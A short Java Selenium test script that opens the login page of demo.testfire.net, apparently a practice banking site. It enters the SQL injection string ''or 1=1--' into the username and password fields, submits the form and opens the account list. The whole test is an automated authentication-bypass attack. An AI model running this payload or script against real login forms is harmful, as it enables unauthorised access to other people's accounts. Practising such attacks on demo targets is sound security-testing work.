package web;
import org.openqa.selenium.*;
import org.openqa.selenium.chrome.ChromeDriver;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;

public class log {
WebDriver driver;
	
	@BeforeClass
	public void setup() {
		System.setProperty("webdriver.chrome.driver", "C:\\Users\\Arjun\\OneDrive\\Desktop\\chromedriver-win64\\chromedriver.exe");
		driver = new ChromeDriver();
        driver.manage().window().maximize();
		}
	@Test
	public void use() throws InterruptedException {
		 driver.get("https://demo.testfire.net/login.jsp");
         driver.findElement(By.name("uid")).sendKeys("'or 1=1--");
         Thread.sleep(2000);

		 driver.findElement(By.name("passw")).sendKeys("'or 1=1--");
		 Thread.sleep(2000);
		 
		 driver.findElement(By.name("btnSubmit")).click();
		 Thread.sleep(2000);
		 
		 driver.findElement(By.name("listAccounts")).click();
		 Thread.sleep(2000);
		  
		 driver.findElement(By.id("btnGetAccount")).click();
		 driver.quit();
         
	     
	}
	


}
